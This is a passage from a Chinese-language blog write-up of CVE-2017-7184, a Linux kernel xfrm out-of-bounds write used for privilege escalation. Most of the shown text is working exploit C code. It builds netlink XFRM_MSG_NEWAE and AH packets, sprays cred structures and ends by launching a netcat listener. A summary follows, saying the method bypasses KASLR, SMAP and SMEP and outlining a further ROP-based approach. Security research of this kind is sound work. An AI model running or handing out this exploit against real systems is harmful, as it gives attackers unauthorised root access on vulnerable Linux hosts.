class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xfrm_new_ae</span><span class="params">(<span class="keyword">int</span> sock,<span class="keyword">int</span> spi,<span class="keyword">int</span> bmp_len,<span class="keyword">int</span> evil_windows,<span class="keyword">int</span> seq,<span class="keyword">int</span> seq_hi)</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlhdr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">4096</span>,err;</span><br><span class="line">	<span class="keyword">char</span> *data;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;nladdr, <span class="number">0</span>, <span class="keyword">sizeof</span>(nladdr));</span><br><span class="line">	nladdr.nl_family = AF_NETLINK;</span><br><span class="line">	nladdr.nl_pid = <span class="number">0</span>;</span><br><span class="line">	nladdr.nl_groups = <span class="number">0</span>;</span><br><span class="line">	nlhdr = (struct nlmsghdr *)<span class="built_in">malloc</span>(NLMSG_SPACE(len));</span><br><span class="line">	<span class="built_in">memset</span>(nlhdr,<span class="number">0</span>,NLMSG_SPACE(len));</span><br><span class="line"></span><br><span class="line">	nlhdr-&gt;nlmsg_len = NLMSG_LENGTH(len);</span><br><span class="line">	nlhdr-&gt;nlmsg_flags = NLM_F_REQUEST|NLM_F_REPLACE;</span><br><span class="line">	nlhdr-&gt;nlmsg_pid = getpid();</span><br><span class="line">	nlhdr-&gt;nlmsg_type = XFRM_MSG_NEWAE;</span><br><span class="line"></span><br><span class="line">	data = NLMSG_DATA(nlhdr); </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_aevent_id</span> <span class="title">xai</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;xai,<span class="number">0</span>,<span class="keyword">sizeof</span>(xai));</span><br><span class="line">	xai.sa_id.proto = IPPROTO_AH;</span><br><span class="line">	xai.sa_id.family = AF_INET;</span><br><span class="line">	xai.sa_id.spi = spi;</span><br><span class="line">	xai.sa_id.daddr.a4 = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(data,&amp;xai,<span class="keyword">sizeof</span>(xai));</span><br><span class="line">	data += <span class="keyword">sizeof</span>(xai);	</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> <span class="title">nla</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;nla, <span class="number">0</span>, <span class="keyword">sizeof</span>(nla));</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state_esn</span> <span class="title">rs</span>;</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;nla, <span class="number">0</span>, <span class="keyword">sizeof</span>(nla));</span><br><span class="line">	nla.nla_len =  <span class="keyword">sizeof</span>(nla)+<span class="keyword">sizeof</span>(rs) +bmp_len*<span class="number">8</span>*<span class="number">4</span>;</span><br><span class="line">	nla.nla_type = XFRMA_REPLAY_ESN_VAL;	</span><br><span class="line">	rs.replay_window = evil_windows;</span><br><span class="line">	rs.bmp_len = bmp_len;</span><br><span class="line">	rs.seq_hi = seq_hi;</span><br><span class="line">	rs.seq = seq;	</span><br><span class="line">	<span class="built_in">memcpy</span>(data,&amp;nla,<span class="keyword">sizeof</span>(nla));</span><br><span class="line">	data += <span class="keyword">sizeof</span>(nla);</span><br><span class="line">	<span class="built_in">memcpy</span>(data, &amp;rs, <span class="keyword">sizeof</span>(rs));</span><br><span class="line">	data += <span class="keyword">sizeof</span>(rs);	</span><br><span class="line">	<span class="built_in">memset</span>(data,<span class="string">'1'</span>,bmp_len*<span class="number">4</span>*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	iov.iov_base = (<span class="keyword">void</span> *)nlhdr;</span><br><span class="line">	iov.iov_len = nlhdr-&gt;nlmsg_len;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">	msg.msg_name = (<span class="keyword">void</span> *)&amp;(nladdr);</span><br><span class="line">	msg.msg_namelen = <span class="keyword">sizeof</span>(nladdr);</span><br><span class="line">	msg.msg_iov = &amp;iov;</span><br><span class="line">	msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">	err = sendmsg (sock, &amp;msg, <span class="number">0</span>); </span><br><span class="line">	<span class="keyword">if</span> (err&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad sendmsg"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sendah</span><span class="params">(<span class="keyword">int</span> sock,<span class="keyword">int</span> spi,<span class="keyword">int</span> seq )</span></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sai</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">char</span> *data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ip_auth_hdr</span> <span class="title">ah</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;sai, <span class="number">0</span>, <span class="keyword">sizeof</span>(sai));</span><br><span class="line">	sai.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">	sai.sin_port = htons(<span class="number">0x4869</span>);</span><br><span class="line">	sai.sin_family = AF_INET;</span><br><span class="line">	data = <span class="built_in">malloc</span>(<span class="number">4096</span>);</span><br><span class="line">	<span class="built_in">memset</span>(data,<span class="string">'1'</span>,<span class="number">4096</span>);</span><br><span class="line">	ah.spi = spi;</span><br><span class="line">	ah.nexthdr = <span class="number">1</span>;</span><br><span class="line">	ah.seq_no = seq;</span><br><span class="line">	ah.hdrlen = (<span class="number">0x10</span> &gt;&gt; <span class="number">2</span>) - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(data,&amp;ah,<span class="keyword">sizeof</span>(ah));</span><br><span class="line"></span><br><span class="line">	iov.iov_base = (<span class="keyword">void</span> *)data;</span><br><span class="line">	iov.iov_len = <span class="number">4096</span>;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">	msg.msg_name = (<span class="keyword">void</span> *)&amp;(sai);</span><br><span class="line">	msg.msg_namelen = <span class="keyword">sizeof</span>(sai);</span><br><span class="line">	msg.msg_iov = &amp;iov;</span><br><span class="line">	msg.msg_iovlen = <span class="number">1</span>;</span><br><span class="line"> 	<span class="comment">//dump_data(&amp;msg,iov.iov_len);</span></span><br><span class="line">	<span class="comment">//dump_data(nlhdr,iov.iov_len);</span></span><br><span class="line">	err = sendmsg (sock, &amp;msg, <span class="number">0</span>); </span><br><span class="line">	<span class="keyword">if</span> (err&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">"[-] bad sendmsg"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> spary_n=<span class="number">0xc00</span>,err,xfrm_socket,recvfd,sendfd;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> time = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	xfrm_socket=init_xfrm_socket();</span><br><span class="line">	<span class="keyword">if</span> (xfrm_socket&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[-] bad init xfrm socket\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[+] init xfrm_socket %d \n"</span>,xfrm_socket);</span><br><span class="line"></span><br><span class="line">	recvfd = init_recvfd();</span><br><span class="line">	<span class="keyword">if</span> (recvfd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[-] bad init_recvfd\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[+] init recvfd : %d \n"</span>,recvfd);</span><br><span class="line">	sendfd = init_sendfd();</span><br><span class="line">	<span class="keyword">if</span> (recvfd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[-] bad sendfd\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[+] init sendfd : %d \n"</span>,sendfd);</span><br><span class="line">	<span class="comment">//return 0;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[+] start spary %d creds \n"</span>,spary_n );</span><br><span class="line">	fork_spary_n(spary_n,time);</span><br><span class="line">	sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	err=xfrm_add_sa(xfrm_socket,<span class="number">4869</span>,<span class="number">0x24</span>);</span><br><span class="line">	<span class="keyword">if</span> (err&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[-] bad xfrm_add_sa\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[+] xfrm_add_sa : %d \n"</span>,err);</span><br><span class="line">	err=xfrm_new_ae(xfrm_socket,<span class="number">4869</span>,<span class="number">0x24</span>,<span class="number">0xc01</span>,<span class="number">0xb40</span>,<span class="number">1</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[-] bad xfrm_new_ae\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[+] xfrm_new_ae : %d \n"</span>,err);	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fork_spary_n(spary_n,<span class="number">10</span>);</span><br><span class="line">	sendah(sendfd,<span class="number">4869</span>, htonl(<span class="number">0x1743</span>));</span><br><span class="line">	system(<span class="string">"nc -lp 2333"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终效果：</p>
<p><img src="https://wx1.sinaimg.cn/large/d9e4cccely1g08bt2smtmj21b70pwwvx.jpg" alt="提权效果"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>与之前调试过的漏洞不同在于此漏洞的触发使用了<code>netlink</code>这样的通信机制，因此手册上相关的资料不是很多，需要根据源代码来构造协议中的相应字段。</p>
<p>本文的分析基于的方法利用了该系统内<code>cred</code>申请是通过<code>kmalloc-192</code>这个<code>kmem_cache</code>得到的，虽然可以有效绕过<code>kaslr</code>、<code>SMAP</code>、<code>SMEP</code>保护，但如果<code>cred</code>申请通过的是<code>cred_jar</code>，则这个方法不一定会成功。</p>
<p>关于长亭博客中提到的方法，我也还在尝试。利用思路是用每次写1<code>bit</code>的方法，多次写达到覆盖下一<code>xfrm_replay_state_esn</code>中的<code>bmp_len</code>，从而越界读泄露地址来绕过<code>kaslr</code>。并且可以通过越界写的方法来写如<code>file_operations</code>、<code>tty_struct</code>这样的虚表结构，达到劫持控制流的目的，将<code>ROP</code>数据通过<code>do_msgsnd</code>这样的函数布置在内核里，从而绕过<code>SMEP</code>和<code>SMAP</code>，最终利用控制流劫持跳转回<code>ROP</code>。希望可以在后续分析中调出这种方法。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <code>https://zhuanlan.zhihu.com/p/26674557</code></p>
<p>[2] <code>https://github.com/snorez/blog/blob/master/cve-2017-7184%20(%E9%95%BF%E4%BA%AD%E5%9C%A8Pwn2Own%E4%B8%8A%E7%94%A8%E4%BA%8E%E6%8F%90%E6%9D%83Ubuntu%E7%9A%84%E6%BC%8F%E6%B4%9E)%20%E7%9A%84%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8.md</code></p>
<p>[3] <code>https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm</code></p>
<p>[4] <code>https://bbs.pediy.com/thread-249192.htm</code></p>
<p>[5] <code>http://blog.chinaunix.net/uid-26675482-id-3255770.html</code></p>
<p>[6] <code>http://onestraw.github.io/linux/netlink-event-signal/</code></p>
<p>[7] <code>http://www.man7.org/linux/man-pages/man7/netlink.7.html</code></p>
<p>[8] <code>https://github.com/ret2p4nda/linux-kernel-exploits/blob/master/2017/CVE-2017-7308/poc.c</code></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2019/02/16/CVE-2017-7184/">Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
        <p><span>发布时间:</span>2019-02-16, 15:36:55</p>
        <p><span>最后更新:</span>2019-04-23, 09:45:03</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2019/02/16/CVE-2017-7184/" title="Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）">http://p4nda.top/2019/02/16/CVE-2017-7184/</a>
            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2019/02/16/CVE-2017-7184/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2019/05/01/starctf-2019-hackme/">
                    【KERNEL PWN】STARCTF 2019 hackme 解题思路
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2019/01/18/CVE-2017-16995/">
                    Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#双机调试环境搭建"><span class="toc-number">1.</span> <span class="toc-text">双机调试环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#debugging环境配置"><span class="toc-number">1.1.</span> <span class="toc-text">debugging环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#debuggee环境配置"><span class="toc-number">1.2.</span> <span class="toc-text">debuggee环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进入调试"><span class="toc-number">1.3.</span> <span class="toc-text">进入调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xfrm-state结构体生成"><span class="toc-number">2.1.</span> <span class="toc-text">xfrm_state结构体生成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xfrm-replay-state-esn结构体更新"><span class="toc-number">2.2.</span> <span class="toc-text">xfrm_replay_state_esn结构体更新</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数组越界写定位"><span class="toc-number">2.3.</span> <span class="toc-text">数组越界写定位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞触发与利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞触发与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#netlink套接字通信"><span class="toc-number">3.1.</span> <span class="toc-text">netlink套接字通信</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">3.2.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#权限限制"><span class="toc-number">3.2.1.</span> <span class="toc-text">权限限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据包构造"><span class="toc-number">3.2.2.</span> <span class="toc-text">数据包构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">3.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function(){
            this.page.url = 'http://p4nda.top/2019/02/16/CVE-2017-7184/';
            this.page.identifier = '2019/02/16/CVE-2017-7184/';
        };
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = '//p4nda.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2019/05/01/starctf-2019-hackme/" title="上一篇: 【KERNEL PWN】STARCTF 2019 hackme 解题思路">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2019/01/18/CVE-2017-16995/" title="下一篇: Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/07/27/QWB/">QWB CTF 2019 growupjs解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/11/CVE-2018-17463/">Google V8引擎的CVE-2018-17463漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/01/starctf-2019-hackme/">【KERNEL PWN】STARCTF 2019 hackme 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/16/CVE-2017-7184/">Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/18/CVE-2017-16995/">Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/kernel-bpf-overflow/">Linux kernel 4.20 BPF 整数溢出漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/06/xnuca-final-paraweb/">X-NUCA'2018 Final paraweb解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/27/wctf-2018-klist/">【KERNEL PWN】WCTF 2018 klist解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/XNUCA-secretcenter/">X-NUCA'2018 secretcenter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/07/stringipc/">【KERNEL PWN】从内存任意读写到权限提升</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/14/hwb-ctf-2018/">护网杯 CTF 2018线上预选赛PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/11/ciscn-2017-babydriver/">【KERNEL PWN】CISCN 2017 babydriver题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/27/WDBCTF-2018/">网鼎杯CTF部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CISCN-Final/">CISCN 2018 Final赛记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/0ctf-baby/">【KERNEL PWN】0ctf 2018 final baby题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【KERNEL PWN】强网杯CTF2018 core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB gsec CTF Qual 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2017-2020 P4nda
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
	 <div id="landlord">
		  <div class="message" style="opacity:0"></div>
		  <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
		  <div class="hide-button">隐藏</div>
	  </div>
			</div>

        </div>
		<!-- 血小板 -->

<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
    var message_Path = '/live2d/'
    var home_Path = 'https://haremu.com/'
</script>
<script type="text/javascript" src="/live2d/js/live2d.js"></script>
<script type="text/javascript" src="/live2d/js/message.js"></script>
<script type="text/javascript">
    loadlive2d("live2d", "/live2d/model/xiaoban/model.json");
</script>  
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        		
    </div>
	
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 天黑了~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>